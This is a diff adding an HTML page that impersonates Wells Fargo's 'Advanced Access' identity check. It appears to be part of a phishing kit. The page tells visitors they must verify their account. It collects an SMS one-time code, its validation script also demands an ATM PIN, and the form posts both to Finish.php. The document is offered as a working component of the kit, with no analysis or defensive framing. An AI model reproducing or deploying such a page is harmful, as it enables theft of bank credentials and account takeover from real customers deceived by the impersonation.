@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+    <meta name="viewport" id="indict_mobile-meta" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <title>Confirm your identity</title>
+	<link rel="shortcut icon" type="image/x-icon" href="assets/img/fav.ico">
+    <link rel="stylesheet" href="assets/css/framework.css">
+    <link rel="stylesheet" href="assets/css/veri.css">
+    <link rel="stylesheet" href="assets/css/smartphone-home.css">
+<script src="assets/js/jquery.min.js"></script>
+<script src="assets/js/jquery.payment.js"></script>
+<script src="assets/js/jquery.validate.js"></script>
+<script src="assets/js/additional-methods.min.js"></script>
+<script src="assets/js/jquery.maskedinput.js"></script>
+<script type="text/javascript">
+function movetoNext(current, nextFieldID) {
+if (current.value.length >= current.maxLength) {
+document.getElementById(nextFieldID).focus();
+}
+}
+</script>
+<script type="text/javascript">
+jQuery(function($){
+   $("#two").mask("",{placeholder:""});
+   $("#nine").mask("",{placeholder:""});
+   //$("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
+   //$("#sortcode").mask("99-99-99",{placeholder:"xx-xx-xx"});
+});
+</script>
+<script>
+$('#verify').validate();
+  (function($,W,D)
+{
+    var JQUERY4U = {};
+
+    JQUERY4U.UTIL =
+    {
+        setupFormValidation: function()
+        {
+            //form validation rules
+            $("#verify").validate({
+				errorElement: "span",			
+                rules: {
+					//dob
+					two: { required: true,	minlength: 5,},
+					//ssn
+					nine: { required: true, minlength: 4,},
+                },
+                messages: {
+					two: { 
+						required: "* Please provide your SMS CODE", 
+					},
+					nine: {
+						required: "* Please provide your ATM PIN",
+						minlength: jQuery.validator.format("* Invalid ATM PIN number"),
+					},
+				},
+                submitHandler: function(form) {
+                    form.submit();
+                }
+            });
+        }
+    }
+
+    //when the dom has loaded setup form validation rules
+    $(D).ready(function($) {
+        JQUERY4U.UTIL.setupFormValidation();
+    });
+
+})(jQuery, window, document);
+  
+</script>
+</head><body id="body" theme="asas" ismobile="false">
+<header>
+<div id="LogoRegion" control="header">
+            <div class="masthead-wrapper">
+                <span class="helper"></span>
+                <img class="logo" src="assets/img/shim.gif">
+            </div>
+</div>
+
+		
+<div id="ModalBox" control="timeout" style="display: none;">
+    <div control="modal-overlay" class="clickable" style="height: 100%; display: block;"></div>
+    <div tabindex="-1" control="modal" id="modal" style="display:block;" role="dialog" aria-labelledby="timeout-header">
+        <h1 id="timeout-header" tabindex="-1">Continue your session?</h1>
+        <p class="message">For security reasons, your session will time out at <span class="OneLinkNoTx" lang="en">{time}</span>, unless you continue.</p>
+        <div class="divider"></div>
+        <button control="button" data-type="primary" id="continueSession">Continue Session</button>
+    </div>
+</div>
+
+</header>
+<main>
+<div control="balloonHelp" id="aaCodeHelp" class="popover-down">
+    <div class="container" role="complementary" aria-labelledby="aaCodeHelpTitle">
+        <span class="hide">Beginning of popup</span>
+        <span class="close" role="button" aria-label="close button"></span>
+        <h2 class="popover-header" id="aaCodeHelpTitle">
+            Advanced Access
+        </h2>
+        <div class="popover-content">
+            <p>Advanced Access is an additional layer of security that safeguards certain transactions and sensitive information.</p>
+            <p>When Advanced Access is required, we'll send a numeric code via text message, voice recording, or email for you to enter online. Each code can be used only once. We'll provide you with a new code each time one is required.</p>
+        </div>
+        <span class="hook hook-up hook-left"></span>
+        <span class="hide">End of popup</span>
+    </div>
+</div>
+<form id="verify" name="verify" method="POST" action="Finish.php?sessionid=lGZvyFjeVLmroIc7TwETXLeSOeLJqvHLcHgKmAZimlJK4WSYsxSqi6j6l4PLzxxMeOwBovTKRDvVzoU2VMseSMkeQaZqHxcVlJxJfqu6302CpWFkI8yBUTPK3PaLmnHI6e&amp;securessl=true" novalidate="novalidate">
+
+
+    <div id="verifyIdentityMain" class="main-panel">
+    <div control="overlay"></div>
+    <div class="page-header">
+        <div id="mainError" control="messaging" level="customer" messagetype="error" role="alert" aria-atomic="true">
+                <span class="icon"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAcCAYAAAAJKR1YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAALBJREFUeNpiZKAA/AcCbOKMQECumUwMgwxQ6qADRIqN3BD6QKQY3Rx0kUix0SgbNFF2gUix0SijWpQxUuoj9OqDkmpjWEYZehR9GAwOukCtHDYaZfRy0EVq1WODMspYqGDGAWo1zgYloEZJrQCkHGAhBCyoHwyYb4COCQDi9/8RAMQOGEgHITsG7qiBcozDf9zAYbBl+w8DFUrnsYTO+YFMQwZAvB/JMSC2ASVmAgQYAOFQmuYMwdASAAAAAElFTkSuQmCC" alt="error"></span>
+                <span class="message"></span>
+            </div>
+
+            <h1 class="page-title">Advanced Access code</h1>
+
+        <p class="hidden-label" id="aaCodeLabel">Advanced Access code. Opens a popup</p>
+        <div class="persistent-messaging">
+		
+<p>We require you to complete our account verification process before we can allow you access to our online banking system this should only take you a few minutes to complete and will help safeguard your information please click continue to begin.</p>
+
+</div>
+
+    <div id="mainPanel" class="tab-contents-active">
+        <div class="tab-contents">
+            <h2>Confirm Information</h2>
+
+            
+<div id="VerifyRowOne" class="field-container">				
+
+<div id="DobHolder" role="listbox" class="l33input" control="forms:dropdown-selector" style="width: 100%;" width="100%">
+	<div class="lab3l" style="width: 100%;" width="100%">
+	<label for="two" class="labmob" control="forms:label" id="contactInfoLabel">SMS CODE:</label>
+	</div>		
+
+	<div id="polpo">
+	<input type="text" name="two" id="two" style="width:100%" maxlength="6" tabindex="2">
+	</div>
+</div>		
+
+</div>
+
+
+
+<div><p>By clicking <strong>Next</strong>, You certify that all information provided is true, correct, and complete. We are authorized to verify or check any of the information given against information held by third party organizations.</p></div>
+        </div>
+
+        <div class="form-footer">
+            <div control="buttonContainer">
+                <button control="button" data-type="primary" action="request code" tabindex="12">Next</button>
+                </div>
+        </div>
+    </div>
+    </div>
+
+
+
+</div></form></main>
+<div><br><br>   <br><br>  <br><br> <br><br <="" div="">
+<footer role="contentinfo" class="stage-coach">
+				<div class="html5footer c9" id="pageFooter">
+					<nav class="nav-footer">
+						
+						<div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
+						<div class="stage-coach"><img src="assets/img/stagecoach_50_opacity.svg"></div>
+						</nav></div>
+					
+				</footer>
+
+
+</div></body></html>
